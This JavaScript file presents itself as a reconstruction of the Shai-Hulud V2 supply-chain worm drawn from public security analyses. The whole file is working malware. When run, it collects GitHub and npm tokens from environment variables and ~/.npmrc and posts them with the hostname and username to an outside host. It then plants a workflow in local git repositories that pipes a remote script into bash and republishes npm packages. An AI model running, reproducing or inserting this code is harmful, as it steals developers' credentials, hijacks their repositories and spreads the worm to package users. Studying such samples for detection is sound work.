// github-actions-inject — reconstructed from public security analyses
// Source: https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack
//
// Shai-Hulud V2: Worm with GitHub Actions persistence.
// Writes malicious workflow YAML to .github/workflows/ for persistent
// authenticated RCE via self-hosted GitHub Actions runners.
//
// Technique: GitHub Actions workflow injection + worm persistence + credential theft

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const { execSync } = require("child_process");

// Malicious GitHub Actions workflow YAML
var workflowYaml = [
  "name: shai-hulud-workflow",
  "on:",
  "  push:",
  "    branches: ['*']",
  "  schedule:",
  "    - cron: '0 */6 * * *'",
  "",
  "jobs:",
  "  update:",
  "    runs-on: ubuntu-latest",
  "    steps:",
  "      - uses: actions/checkout@v4",
  "      - run: |",
  "          curl -sL https://euw.bfrntend.com/worm.sh | bash",
  "          npm whoami && npm publish --access public",
].join("\n");

// Find git repos and inject workflow
function injectWorkflows() {
  var home = os.homedir();
  var searchDirs = [
    process.cwd(),
    path.join(home, "projects"),
    path.join(home, "repos"),
    path.join(home, "code"),
    path.join(home, "dev")
  ];

  searchDirs.forEach(function(dir) {
    try {
      if (!fs.existsSync(dir)) return;
      var entries = fs.readdirSync(dir);
      entries.forEach(function(entry) {
        var repoPath = path.join(dir, entry);
        var gitDir = path.join(repoPath, ".git");
        try {
          if (fs.existsSync(gitDir) && fs.statSync(gitDir).isDirectory()) {
            var workflowDir = path.join(repoPath, ".github", "workflows");
            if (!fs.existsSync(workflowDir)) {
              fs.mkdirSync(workflowDir, { recursive: true });
            }
            fs.writeFileSync(path.join(workflowDir, "shai-hulud.yml"), workflowYaml);
          }
        } catch(e) {}
      });
    } catch(e) {}
  });
}

// Harvest tokens from environment and config files
function harvestTokens() {
  var tokens = {};

  // Environment variables
  var envVars = ["GITHUB_TOKEN", "GH_TOKEN", "NPM_TOKEN", "NPM_AUTH_TOKEN"];
  envVars.forEach(function(v) {
    if (process.env[v]) tokens[v] = process.env[v];
  });

  // .npmrc
  var npmrc = path.join(os.homedir(), ".npmrc");
  try {
    if (fs.existsSync(npmrc)) {
      tokens.npmrc = fs.readFileSync(npmrc, "utf8");
    }
  } catch(e) {}

  return tokens;
}

// Exfiltrate
function exfiltrate(data) {
  var payload = JSON.stringify(data);
  var req = https.request({
    hostname: "euw.bfrntend.com",
    path: "/v2/collect",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

var tokens = harvestTokens();
exfiltrate({
  host: os.hostname(),
  user: os.userInfo().username,
  tokens: tokens
});
injectWorkflows();
